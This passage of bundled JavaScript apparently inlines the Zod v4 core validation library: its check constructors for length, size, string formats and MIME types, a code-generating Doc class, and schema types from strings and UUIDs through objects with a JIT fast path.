    return !nullish(val) && val.size !== undefined;
  });
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.minimum = def.size;
    bag.maximum = def.size;
    bag.size = def.size;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    const size = input.size;
    if (size === def.size)
      return;
    const tooBig = size > def.size;
    payload.issues.push({
      origin: getSizableOrigin(input),
      ...tooBig ? { code: "too_big", maximum: def.size } : { code: "too_small", minimum: def.size },
      inclusive: true,
      exact: true,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckMaxLength = /* @__PURE__ */ $constructor("$ZodCheckMaxLength", (inst, def) => {
  var _a;
  $ZodCheck.init(inst, def);
  (_a = inst._zod.def).when ?? (_a.when = (payload) => {
    const val = payload.value;
    return !nullish(val) && val.length !== undefined;
  });
  inst._zod.onattach.push((inst2) => {
    const curr = inst2._zod.bag.maximum ?? Number.POSITIVE_INFINITY;
    if (def.maximum < curr)
      inst2._zod.bag.maximum = def.maximum;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    const length = input.length;
    if (length <= def.maximum)
      return;
    const origin = getLengthableOrigin(input);
    payload.issues.push({
      origin,
      code: "too_big",
      maximum: def.maximum,
      inclusive: true,
      input,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckMinLength = /* @__PURE__ */ $constructor("$ZodCheckMinLength", (inst, def) => {
  var _a;
  $ZodCheck.init(inst, def);
  (_a = inst._zod.def).when ?? (_a.when = (payload) => {
    const val = payload.value;
    return !nullish(val) && val.length !== undefined;
  });
  inst._zod.onattach.push((inst2) => {
    const curr = inst2._zod.bag.minimum ?? Number.NEGATIVE_INFINITY;
    if (def.minimum > curr)
      inst2._zod.bag.minimum = def.minimum;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    const length = input.length;
    if (length >= def.minimum)
      return;
    const origin = getLengthableOrigin(input);
    payload.issues.push({
      origin,
      code: "too_small",
      minimum: def.minimum,
      inclusive: true,
      input,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckLengthEquals = /* @__PURE__ */ $constructor("$ZodCheckLengthEquals", (inst, def) => {
  var _a;
  $ZodCheck.init(inst, def);
  (_a = inst._zod.def).when ?? (_a.when = (payload) => {
    const val = payload.value;
    return !nullish(val) && val.length !== undefined;
  });
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.minimum = def.length;
    bag.maximum = def.length;
    bag.length = def.length;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    const length = input.length;
    if (length === def.length)
      return;
    const origin = getLengthableOrigin(input);
    const tooBig = length > def.length;
    payload.issues.push({
      origin,
      ...tooBig ? { code: "too_big", maximum: def.length } : { code: "too_small", minimum: def.length },
      inclusive: true,
      exact: true,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckStringFormat = /* @__PURE__ */ $constructor("$ZodCheckStringFormat", (inst, def) => {
  var _a, _b;
  $ZodCheck.init(inst, def);
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.format = def.format;
    if (def.pattern) {
      bag.patterns ?? (bag.patterns = new Set);
      bag.patterns.add(def.pattern);
    }
  });
  if (def.pattern)
    (_a = inst._zod).check ?? (_a.check = (payload) => {
      def.pattern.lastIndex = 0;
      if (def.pattern.test(payload.value))
        return;
      payload.issues.push({
        origin: "string",
        code: "invalid_format",
        format: def.format,
        input: payload.value,
        ...def.pattern ? { pattern: def.pattern.toString() } : {},
        inst,
        continue: !def.abort
      });
    });
  else
    (_b = inst._zod).check ?? (_b.check = () => {});
});
var $ZodCheckRegex = /* @__PURE__ */ $constructor("$ZodCheckRegex", (inst, def) => {
  $ZodCheckStringFormat.init(inst, def);
  inst._zod.check = (payload) => {
    def.pattern.lastIndex = 0;
    if (def.pattern.test(payload.value))
      return;
    payload.issues.push({
      origin: "string",
      code: "invalid_format",
      format: "regex",
      input: payload.value,
      pattern: def.pattern.toString(),
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckLowerCase = /* @__PURE__ */ $constructor("$ZodCheckLowerCase", (inst, def) => {
  def.pattern ?? (def.pattern = lowercase);
  $ZodCheckStringFormat.init(inst, def);
});
var $ZodCheckUpperCase = /* @__PURE__ */ $constructor("$ZodCheckUpperCase", (inst, def) => {
  def.pattern ?? (def.pattern = uppercase);
  $ZodCheckStringFormat.init(inst, def);
});
var $ZodCheckIncludes = /* @__PURE__ */ $constructor("$ZodCheckIncludes", (inst, def) => {
  $ZodCheck.init(inst, def);
  const escapedRegex = escapeRegex(def.includes);
  const pattern = new RegExp(typeof def.position === "number" ? `^.{${def.position}}${escapedRegex}` : escapedRegex);
  def.pattern = pattern;
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.patterns ?? (bag.patterns = new Set);
    bag.patterns.add(pattern);
  });
  inst._zod.check = (payload) => {
    if (payload.value.includes(def.includes, def.position))
      return;
    payload.issues.push({
      origin: "string",
      code: "invalid_format",
      format: "includes",
      includes: def.includes,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckStartsWith = /* @__PURE__ */ $constructor("$ZodCheckStartsWith", (inst, def) => {
  $ZodCheck.init(inst, def);
  const pattern = new RegExp(`^${escapeRegex(def.prefix)}.*`);
  def.pattern ?? (def.pattern = pattern);
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.patterns ?? (bag.patterns = new Set);
    bag.patterns.add(pattern);
  });
  inst._zod.check = (payload) => {
    if (payload.value.startsWith(def.prefix))
      return;
    payload.issues.push({
      origin: "string",
      code: "invalid_format",
      format: "starts_with",
      prefix: def.prefix,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckEndsWith = /* @__PURE__ */ $constructor("$ZodCheckEndsWith", (inst, def) => {
  $ZodCheck.init(inst, def);
  const pattern = new RegExp(`.*${escapeRegex(def.suffix)}$`);
  def.pattern ?? (def.pattern = pattern);
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.patterns ?? (bag.patterns = new Set);
    bag.patterns.add(pattern);
  });
  inst._zod.check = (payload) => {
    if (payload.value.endsWith(def.suffix))
      return;
    payload.issues.push({
      origin: "string",
      code: "invalid_format",
      format: "ends_with",
      suffix: def.suffix,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
function handleCheckPropertyResult(result, payload, property) {
  if (result.issues.length) {
    payload.issues.push(...prefixIssues(property, result.issues));
  }
}
var $ZodCheckProperty = /* @__PURE__ */ $constructor("$ZodCheckProperty", (inst, def) => {
  $ZodCheck.init(inst, def);
  inst._zod.check = (payload) => {
    const result = def.schema._zod.run({
      value: payload.value[def.property],
      issues: []
    }, {});
    if (result instanceof Promise) {
      return result.then((result2) => handleCheckPropertyResult(result2, payload, def.property));
    }
    handleCheckPropertyResult(result, payload, def.property);
    return;
  };
});
var $ZodCheckMimeType = /* @__PURE__ */ $constructor("$ZodCheckMimeType", (inst, def) => {
  $ZodCheck.init(inst, def);
  const mimeSet = new Set(def.mime);
  inst._zod.onattach.push((inst2) => {
    inst2._zod.bag.mime = def.mime;
  });
  inst._zod.check = (payload) => {
    if (mimeSet.has(payload.value.type))
      return;
    payload.issues.push({
      code: "invalid_value",
      values: def.mime,
      input: payload.value.type,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckOverwrite = /* @__PURE__ */ $constructor("$ZodCheckOverwrite", (inst, def) => {
  $ZodCheck.init(inst, def);
  inst._zod.check = (payload) => {
    payload.value = def.tx(payload.value);
  };
});

// node_modules/zod/v4/core/doc.js
class Doc {
  constructor(args = []) {
    this.content = [];
    this.indent = 0;
    if (this)
      this.args = args;
  }
  indented(fn) {
    this.indent += 1;
    fn(this);
    this.indent -= 1;
  }
  write(arg) {
    if (typeof arg === "function") {
      arg(this, { execution: "sync" });
      arg(this, { execution: "async" });
      return;
    }
    const content = arg;
    const lines = content.split(`
`).filter((x) => x);
    const minIndent = Math.min(...lines.map((x) => x.length - x.trimStart().length));
    const dedented = lines.map((x) => x.slice(minIndent)).map((x) => " ".repeat(this.indent * 2) + x);
    for (const line of dedented) {
      this.content.push(line);
    }
  }
  compile() {
    const F = Function;
    const args = this?.args;
    const content = this?.content ?? [``];
    const lines = [...content.map((x) => `  ${x}`)];
    return new F(...args, lines.join(`
`));
  }
}

// node_modules/zod/v4/core/versions.js
var version = {
  major: 4,
  minor: 3,
  patch: 6
};

// node_modules/zod/v4/core/schemas.js
var $ZodType = /* @__PURE__ */ $constructor("$ZodType", (inst, def) => {
  var _a;
  inst ?? (inst = {});
  inst._zod.def = def;
  inst._zod.bag = inst._zod.bag || {};
  inst._zod.version = version;
  const checks = [...inst._zod.def.checks ?? []];
  if (inst._zod.traits.has("$ZodCheck")) {
    checks.unshift(inst);
  }
  for (const ch of checks) {
    for (const fn of ch._zod.onattach) {
      fn(inst);
    }
  }
  if (checks.length === 0) {
    (_a = inst._zod).deferred ?? (_a.deferred = []);
    inst._zod.deferred?.push(() => {
      inst._zod.run = inst._zod.parse;
    });
  } else {
    const runChecks = (payload, checks2, ctx) => {
      let isAborted = aborted(payload);
      let asyncResult;
      for (const ch of checks2) {
        if (ch._zod.def.when) {
          const shouldRun = ch._zod.def.when(payload);
          if (!shouldRun)
            continue;
        } else if (isAborted) {
          continue;
        }
        const currLen = payload.issues.length;
        const _ = ch._zod.check(payload);
        if (_ instanceof Promise && ctx?.async === false) {
          throw new $ZodAsyncError;
        }
        if (asyncResult || _ instanceof Promise) {
          asyncResult = (asyncResult ?? Promise.resolve()).then(async () => {
            await _;
            const nextLen = payload.issues.length;
            if (nextLen === currLen)
              return;
            if (!isAborted)
              isAborted = aborted(payload, currLen);
          });
        } else {
          const nextLen = payload.issues.length;
          if (nextLen === currLen)
            continue;
          if (!isAborted)
            isAborted = aborted(payload, currLen);
        }
      }
      if (asyncResult) {
        return asyncResult.then(() => {
          return payload;
        });
      }
      return payload;
    };
    const handleCanaryResult = (canary, payload, ctx) => {
      if (aborted(canary)) {
        canary.aborted = true;
        return canary;
      }
      const checkResult = runChecks(payload, checks, ctx);
      if (checkResult instanceof Promise) {
        if (ctx.async === false)
          throw new $ZodAsyncError;
        return checkResult.then((checkResult2) => inst._zod.parse(checkResult2, ctx));
      }
      return inst._zod.parse(checkResult, ctx);
    };
    inst._zod.run = (payload, ctx) => {
      if (ctx.skipChecks) {
        return inst._zod.parse(payload, ctx);
      }
      if (ctx.direction === "backward") {
        const canary = inst._zod.parse({ value: payload.value, issues: [] }, { ...ctx, skipChecks: true });
        if (canary instanceof Promise) {
          return canary.then((canary2) => {
            return handleCanaryResult(canary2, payload, ctx);
          });
        }
        return handleCanaryResult(canary, payload, ctx);
      }
      const result = inst._zod.parse(payload, ctx);
      if (result instanceof Promise) {
        if (ctx.async === false)
          throw new $ZodAsyncError;
        return result.then((result2) => runChecks(result2, checks, ctx));
      }
      return runChecks(result, checks, ctx);
    };
  }
  defineLazy(inst, "~standard", () => ({
    validate: (value) => {
      try {
        const r = safeParse(inst, value);
        return r.success ? { value: r.data } : { issues: r.error?.issues };
      } catch (_) {
        return safeParseAsync(inst, value).then((r) => r.success ? { value: r.data } : { issues: r.error?.issues });
      }
    },
    vendor: "zod",
    version: 1
  }));
});
var $ZodString = /* @__PURE__ */ $constructor("$ZodString", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.pattern = [...inst?._zod.bag?.patterns ?? []].pop() ?? string(inst._zod.bag);
  inst._zod.parse = (payload, _) => {
    if (def.coerce)
      try {
        payload.value = String(payload.value);
      } catch (_2) {}
    if (typeof payload.value === "string")
      return payload;
    payload.issues.push({
      expected: "string",
      code: "invalid_type",
      input: payload.value,
      inst
    });
    return payload;
  };
});
var $ZodStringFormat = /* @__PURE__ */ $constructor("$ZodStringFormat", (inst, def) => {
  $ZodCheckStringFormat.init(inst, def);
  $ZodString.init(inst, def);
});
var $ZodGUID = /* @__PURE__ */ $constructor("$ZodGUID", (inst, def) => {
  def.pattern ?? (def.pattern = guid);
  $ZodStringFormat.init(inst, def);
});
var $ZodUUID = /* @__PURE__ */ $constructor("$ZodUUID", (inst, def) => {
  if (def.version) {
    const versionMap = {
      v1: 1,
      v2: 2,
      v3: 3,
      v4: 4,
      v5: 5,
      v6: 6,
      v7: 7,
      v8: 8
    };
    const v = versionMap[def.version];
    if (v === undefined)
      throw new Error(`Invalid UUID version: "${def.version}"`);
    def.pattern ?? (def.pattern = uuid(v));
  } else
    def.pattern ?? (def.pattern = uuid());
  $ZodStringFormat.init(inst, def);
});
var $ZodEmail = /* @__PURE__ */ $constructor("$ZodEmail", (inst, def) => {
  def.pattern ?? (def.pattern = email);
  $ZodStringFormat.init(inst, def);
});
var $ZodURL = /* @__PURE__ */ $constructor("$ZodURL", (inst, def) => {
  $ZodStringFormat.init(inst, def);
  inst._zod.check = (payload) => {
    try {
      const trimmed = payload.value.trim();
      const url = new URL(trimmed);
      if (def.hostname) {
        def.hostname.lastIndex = 0;
        if (!def.hostname.test(url.hostname)) {
          payload.issues.push({
            code: "invalid_format",
            format: "url",
            note: "Invalid hostname",
            pattern: def.hostname.source,
            input: payload.value,
            inst,
            continue: !def.abort
          });
        }
      }
      if (def.protocol) {
        def.protocol.lastIndex = 0;
        if (!def.protocol.test(url.protocol.endsWith(":") ? url.protocol.slice(0, -1) : url.protocol)) {
          payload.issues.push({
            code: "invalid_format",
            format: "url",
            note: "Invalid protocol",
            pattern: def.protocol.source,
            input: payload.value,
            inst,
            continue: !def.abort
          });
        }
      }
      if (def.normalize) {
        payload.value = url.href;
      } else {
        payload.value = trimmed;
      }
      return;
    } catch (_) {
      payload.issues.push({
        code: "invalid_format",
        format: "url",
        input: payload.value,
        inst,
        continue: !def.abort
      });
    }
  };
});
var $ZodEmoji = /* @__PURE__ */ $constructor("$ZodEmoji", (inst, def) => {
  def.pattern ?? (def.pattern = emoji());
  $ZodStringFormat.init(inst, def);
});
var $ZodNanoID = /* @__PURE__ */ $constructor("$ZodNanoID", (inst, def) => {
  def.pattern ?? (def.pattern = nanoid);
  $ZodStringFormat.init(inst, def);
});
var $ZodCUID = /* @__PURE__ */ $constructor("$ZodCUID", (inst, def) => {
  def.pattern ?? (def.pattern = cuid);
  $ZodStringFormat.init(inst, def);
});
var $ZodCUID2 = /* @__PURE__ */ $constructor("$ZodCUID2", (inst, def) => {
  def.pattern ?? (def.pattern = cuid2);
  $ZodStringFormat.init(inst, def);
});
var $ZodULID = /* @__PURE__ */ $constructor("$ZodULID", (inst, def) => {
  def.pattern ?? (def.pattern = ulid);
  $ZodStringFormat.init(inst, def);
});
var $ZodXID = /* @__PURE__ */ $constructor("$ZodXID", (inst, def) => {
  def.pattern ?? (def.pattern = xid);
  $ZodStringFormat.init(inst, def);
});
var $ZodKSUID = /* @__PURE__ */ $constructor("$ZodKSUID", (inst, def) => {
  def.pattern ?? (def.pattern = ksuid);
  $ZodStringFormat.init(inst, def);
});
var $ZodISODateTime = /* @__PURE__ */ $constructor("$ZodISODateTime", (inst, def) => {
  def.pattern ?? (def.pattern = datetime(def));
  $ZodStringFormat.init(inst, def);
});
var $ZodISODate = /* @__PURE__ */ $constructor("$ZodISODate", (inst, def) => {
  def.pattern ?? (def.pattern = date);
  $ZodStringFormat.init(inst, def);
});
var $ZodISOTime = /* @__PURE__ */ $constructor("$ZodISOTime", (inst, def) => {
  def.pattern ?? (def.pattern = time(def));
  $ZodStringFormat.init(inst, def);
});
var $ZodISODuration = /* @__PURE__ */ $constructor("$ZodISODuration", (inst, def) => {
  def.pattern ?? (def.pattern = duration);
  $ZodStringFormat.init(inst, def);
});
var $ZodIPv4 = /* @__PURE__ */ $constructor("$ZodIPv4", (inst, def) => {
  def.pattern ?? (def.pattern = ipv4);
  $ZodStringFormat.init(inst, def);
  inst._zod.bag.format = `ipv4`;
});
var $ZodIPv6 = /* @__PURE__ */ $constructor("$ZodIPv6", (inst, def) => {
  def.pattern ?? (def.pattern = ipv6);
  $ZodStringFormat.init(inst, def);
  inst._zod.bag.format = `ipv6`;
  inst._zod.check = (payload) => {
    try {
      new URL(`http://[${payload.value}]`);
    } catch {
      payload.issues.push({
        code: "invalid_format",
        format: "ipv6",
        input: payload.value,
        inst,
        continue: !def.abort
      });
    }
  };
});
var $ZodMAC = /* @__PURE__ */ $constructor("$ZodMAC", (inst, def) => {
  def.pattern ?? (def.pattern = mac(def.delimiter));
  $ZodStringFormat.init(inst, def);
  inst._zod.bag.format = `mac`;
});
var $ZodCIDRv4 = /* @__PURE__ */ $constructor("$ZodCIDRv4", (inst, def) => {
  def.pattern ?? (def.pattern = cidrv4);
  $ZodStringFormat.init(inst, def);
});
var $ZodCIDRv6 = /* @__PURE__ */ $constructor("$ZodCIDRv6", (inst, def) => {
  def.pattern ?? (def.pattern = cidrv6);
  $ZodStringFormat.init(inst, def);
  inst._zod.check = (payload) => {
    const parts = payload.value.split("/");
    try {
      if (parts.length !== 2)
        throw new Error;
      const [address, prefix] = parts;
      if (!prefix)
        throw new Error;
      const prefixNum = Number(prefix);
      if (`${prefixNum}` !== prefix)
        throw new Error;
      if (prefixNum < 0 || prefixNum > 128)
        throw new Error;
      new URL(`http://[${address}]`);
    } catch {
      payload.issues.push({
        code: "invalid_format",
        format: "cidrv6",
        input: payload.value,
        inst,
        continue: !def.abort
      });
    }
  };
});
function isValidBase64(data) {
  if (data === "")
    return true;
  if (data.length % 4 !== 0)
    return false;
  try {
    atob(data);
    return true;
  } catch {
    return false;
  }
}
var $ZodBase64 = /* @__PURE__ */ $constructor("$ZodBase64", (inst, def) => {
  def.pattern ?? (def.pattern = base64);
  $ZodStringFormat.init(inst, def);
  inst._zod.bag.contentEncoding = "base64";
  inst._zod.check = (payload) => {
    if (isValidBase64(payload.value))
      return;
    payload.issues.push({
      code: "invalid_format",
      format: "base64",
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
function isValidBase64URL(data) {
  if (!base64url.test(data))
    return false;
  const base642 = data.replace(/[-_]/g, (c) => c === "-" ? "+" : "/");
  const padded = base642.padEnd(Math.ceil(base642.length / 4) * 4, "=");
  return isValidBase64(padded);
}
var $ZodBase64URL = /* @__PURE__ */ $constructor("$ZodBase64URL", (inst, def) => {
  def.pattern ?? (def.pattern = base64url);
  $ZodStringFormat.init(inst, def);
  inst._zod.bag.contentEncoding = "base64url";
  inst._zod.check = (payload) => {
    if (isValidBase64URL(payload.value))
      return;
    payload.issues.push({
      code: "invalid_format",
      format: "base64url",
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodE164 = /* @__PURE__ */ $constructor("$ZodE164", (inst, def) => {
  def.pattern ?? (def.pattern = e164);
  $ZodStringFormat.init(inst, def);
});
function isValidJWT(token, algorithm = null) {
  try {
    const tokensParts = token.split(".");
    if (tokensParts.length !== 3)
      return false;
    const [header] = tokensParts;
    if (!header)
      return false;
    const parsedHeader = JSON.parse(atob(header));
    if ("typ" in parsedHeader && parsedHeader?.typ !== "JWT")
      return false;
    if (!parsedHeader.alg)
      return false;
    if (algorithm && (!("alg" in parsedHeader) || parsedHeader.alg !== algorithm))
      return false;
    return true;
  } catch {
    return false;
  }
}
var $ZodJWT = /* @__PURE__ */ $constructor("$ZodJWT", (inst, def) => {
  $ZodStringFormat.init(inst, def);
  inst._zod.check = (payload) => {
    if (isValidJWT(payload.value, def.alg))
      return;
    payload.issues.push({
      code: "invalid_format",
      format: "jwt",
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCustomStringFormat = /* @__PURE__ */ $constructor("$ZodCustomStringFormat", (inst, def) => {
  $ZodStringFormat.init(inst, def);
  inst._zod.check = (payload) => {
    if (def.fn(payload.value))
      return;
    payload.issues.push({
      code: "invalid_format",
      format: def.format,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodNumber = /* @__PURE__ */ $constructor("$ZodNumber", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.pattern = inst._zod.bag.pattern ?? number;
  inst._zod.parse = (payload, _ctx) => {
    if (def.coerce)
      try {
        payload.value = Number(payload.value);
      } catch (_) {}
    const input = payload.value;
    if (typeof input === "number" && !Number.isNaN(input) && Number.isFinite(input)) {
      return payload;
    }
    const received = typeof input === "number" ? Number.isNaN(input) ? "NaN" : !Number.isFinite(input) ? "Infinity" : undefined : undefined;
    payload.issues.push({
      expected: "number",
      code: "invalid_type",
      input,
      inst,
      ...received ? { received } : {}
    });
    return payload;
  };
});
var $ZodNumberFormat = /* @__PURE__ */ $constructor("$ZodNumberFormat", (inst, def) => {
  $ZodCheckNumberFormat.init(inst, def);
  $ZodNumber.init(inst, def);
});
var $ZodBoolean = /* @__PURE__ */ $constructor("$ZodBoolean", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.pattern = boolean;
  inst._zod.parse = (payload, _ctx) => {
    if (def.coerce)
      try {
        payload.value = Boolean(payload.value);
      } catch (_) {}
    const input = payload.value;
    if (typeof input === "boolean")
      return payload;
    payload.issues.push({
      expected: "boolean",
      code: "invalid_type",
      input,
      inst
    });
    return payload;
  };
});
var $ZodBigInt = /* @__PURE__ */ $constructor("$ZodBigInt", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.pattern = bigint;
  inst._zod.parse = (payload, _ctx) => {
    if (def.coerce)
      try {
        payload.value = BigInt(payload.value);
      } catch (_) {}
    if (typeof payload.value === "bigint")
      return payload;
    payload.issues.push({
      expected: "bigint",
      code: "invalid_type",
      input: payload.value,
      inst
    });
    return payload;
  };
});
var $ZodBigIntFormat = /* @__PURE__ */ $constructor("$ZodBigIntFormat", (inst, def) => {
  $ZodCheckBigIntFormat.init(inst, def);
  $ZodBigInt.init(inst, def);
});
var $ZodSymbol = /* @__PURE__ */ $constructor("$ZodSymbol", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (typeof input === "symbol")
      return payload;
    payload.issues.push({
      expected: "symbol",
      code: "invalid_type",
      input,
      inst
    });
    return payload;
  };
});
var $ZodUndefined = /* @__PURE__ */ $constructor("$ZodUndefined", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.pattern = _undefined;
  inst._zod.values = new Set([undefined]);
  inst._zod.optin = "optional";
  inst._zod.optout = "optional";
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (typeof input === "undefined")
      return payload;
    payload.issues.push({
      expected: "undefined",
      code: "invalid_type",
      input,
      inst
    });
    return payload;
  };
});
var $ZodNull = /* @__PURE__ */ $constructor("$ZodNull", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.pattern = _null;
  inst._zod.values = new Set([null]);
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (input === null)
      return payload;
    payload.issues.push({
      expected: "null",
      code: "invalid_type",
      input,
      inst
    });
    return payload;
  };
});
var $ZodAny = /* @__PURE__ */ $constructor("$ZodAny", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload) => payload;
});
var $ZodUnknown = /* @__PURE__ */ $constructor("$ZodUnknown", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload) => payload;
});
var $ZodNever = /* @__PURE__ */ $constructor("$ZodNever", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, _ctx) => {
    payload.issues.push({
      expected: "never",
      code: "invalid_type",
      input: payload.value,
      inst
    });
    return payload;
  };
});
var $ZodVoid = /* @__PURE__ */ $constructor("$ZodVoid", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (typeof input === "undefined")
      return payload;
    payload.issues.push({
      expected: "void",
      code: "invalid_type",
      input,
      inst
    });
    return payload;
  };
});
var $ZodDate = /* @__PURE__ */ $constructor("$ZodDate", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, _ctx) => {
    if (def.coerce) {
      try {
        payload.value = new Date(payload.value);
      } catch (_err) {}
    }
    const input = payload.value;
    const isDate = input instanceof Date;
    const isValidDate = isDate && !Number.isNaN(input.getTime());
    if (isValidDate)
      return payload;
    payload.issues.push({
      expected: "date",
      code: "invalid_type",
      input,
      ...isDate ? { received: "Invalid Date" } : {},
      inst
    });
    return payload;
  };
});
function handleArrayResult(result, final, index) {
  if (result.issues.length) {
    final.issues.push(...prefixIssues(index, result.issues));
  }
  final.value[index] = result.value;
}
var $ZodArray = /* @__PURE__ */ $constructor("$ZodArray", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    if (!Array.isArray(input)) {
      payload.issues.push({
        expected: "array",
        code: "invalid_type",
        input,
        inst
      });
      return payload;
    }
    payload.value = Array(input.length);
    const proms = [];
    for (let i = 0;i < input.length; i++) {
      const item = input[i];
      const result = def.element._zod.run({
        value: item,
        issues: []
      }, ctx);
      if (result instanceof Promise) {
        proms.push(result.then((result2) => handleArrayResult(result2, payload, i)));
      } else {
        handleArrayResult(result, payload, i);
      }
    }
    if (proms.length) {
      return Promise.all(proms).then(() => payload);
    }
    return payload;
  };
});
function handlePropertyResult(result, final, key, input, isOptionalOut) {
  if (result.issues.length) {
    if (isOptionalOut && !(key in input)) {
      return;
    }
    final.issues.push(...prefixIssues(key, result.issues));
  }
  if (result.value === undefined) {
    if (key in input) {
      final.value[key] = undefined;
    }
  } else {
    final.value[key] = result.value;
  }
}
function normalizeDef(def) {
  const keys = Object.keys(def.shape);
  for (const k of keys) {
    if (!def.shape?.[k]?._zod?.traits?.has("$ZodType")) {
      throw new Error(`Invalid element at key "${k}": expected a Zod schema`);
    }
  }
  const okeys = optionalKeys(def.shape);
  return {
    ...def,
    keys,
    keySet: new Set(keys),
    numKeys: keys.length,
    optionalKeys: new Set(okeys)
  };
}
function handleCatchall(proms, input, payload, ctx, def, inst) {
  const unrecognized = [];
  const keySet = def.keySet;
  const _catchall = def.catchall._zod;
  const t = _catchall.def.type;
  const isOptionalOut = _catchall.optout === "optional";
  for (const key in input) {
    if (keySet.has(key))
      continue;
    if (t === "never") {
      unrecognized.push(key);
      continue;
    }
    const r = _catchall.run({ value: input[key], issues: [] }, ctx);
    if (r instanceof Promise) {
      proms.push(r.then((r2) => handlePropertyResult(r2, payload, key, input, isOptionalOut)));
    } else {
      handlePropertyResult(r, payload, key, input, isOptionalOut);
    }
  }
  if (unrecognized.length) {
    payload.issues.push({
      code: "unrecognized_keys",
      keys: unrecognized,
      input,
      inst
    });
  }
  if (!proms.length)
    return payload;
  return Promise.all(proms).then(() => {
    return payload;
  });
}
var $ZodObject = /* @__PURE__ */ $constructor("$ZodObject", (inst, def) => {
  $ZodType.init(inst, def);
  const desc = Object.getOwnPropertyDescriptor(def, "shape");
  if (!desc?.get) {
    const sh = def.shape;
    Object.defineProperty(def, "shape", {
      get: () => {
        const newSh = { ...sh };
        Object.defineProperty(def, "shape", {
          value: newSh
        });
        return newSh;
      }
    });
  }
  const _normalized = cached(() => normalizeDef(def));
  defineLazy(inst._zod, "propValues", () => {
    const shape = def.shape;
    const propValues = {};
    for (const key in shape) {
      const field = shape[key]._zod;
      if (field.values) {
        propValues[key] ?? (propValues[key] = new Set);
        for (const v of field.values)
          propValues[key].add(v);
      }
    }
    return propValues;
  });
  const isObject2 = isObject;
  const catchall = def.catchall;
  let value;
  inst._zod.parse = (payload, ctx) => {
    value ?? (value = _normalized.value);
    const input = payload.value;
    if (!isObject2(input)) {
      payload.issues.push({
        expected: "object",
        code: "invalid_type",
        input,
        inst
      });
      return payload;
    }
    payload.value = {};
    const proms = [];
    const shape = value.shape;
    for (const key of value.keys) {
      const el = shape[key];
      const isOptionalOut = el._zod.optout === "optional";
      const r = el._zod.run({ value: input[key], issues: [] }, ctx);
      if (r instanceof Promise) {
        proms.push(r.then((r2) => handlePropertyResult(r2, payload, key, input, isOptionalOut)));
      } else {
        handlePropertyResult(r, payload, key, input, isOptionalOut);
      }
    }
    if (!catchall) {
      return proms.length ? Promise.all(proms).then(() => payload) : payload;
    }
    return handleCatchall(proms, input, payload, ctx, _normalized.value, inst);
  };
});
var $ZodObjectJIT = /* @__PURE__ */ $constructor("$ZodObjectJIT", (inst, def) => {
  $ZodObject.init(inst, def);
  const superParse = inst._zod.parse;
  const _normalized = cached(() => normalizeDef(def));
  const generateFastpass = (shape) => {
    const doc = new Doc(["shape", "payload", "ctx"]);
    const normalized = _normalized.value;
    const parseStr = (key) => {
      const k = esc(key);
      return `shape[${k}]._zod.run({ value: input[${k}], issues: [] }, ctx)`;
    };
    doc.write(`const input = payload.value;`);
    const ids = Object.create(null);
    let counter = 0;
    for (const key of normalized.keys) {
      ids[key] = `key_${counter++}`;
    }
    doc.write(`const newResult = {};`);
    for (const key of normalized.keys) {
      const id = ids[key];
      const k = esc(key);
      const schema = shape[key];
      const isOptionalOut = schema?._zod?.optout === "optional";
      doc.write(`const ${id} = ${parseStr(key)};`);
      if (isOptionalOut) {
        doc.write(`
        if (${id}.issues.length) {
          if (${k} in input) {
            payload.issues = payload.issues.concat(${id}.issues.map(iss => ({
              ...iss,
              path: iss.path ? [${k}, ...iss.path] : [${k}]
            })));
          }
        }
        
        if (${id}.value === undefined) {
          if (${k} in input) {
            newResult[${k}] = undefined;
          }
        } else {
          newResult[${k}] = ${id}.value;
        }
        
      `);
      } else {
        doc.write(`
        if (${id}.issues.length) {
          payload.issues = payload.issues.concat(${id}.issues.map(iss => ({
            ...iss,
            path: iss.path ? [${k}, ...iss.path] : [${k}]
          })));
        }
        
        if (${id}.value === undefined) {
          if (${k} in input) {
            newResult[${k}] = undefined;
          }
        } else {
          newResult[${k}] = ${id}.value;
        }
        
      `);
      }
    }
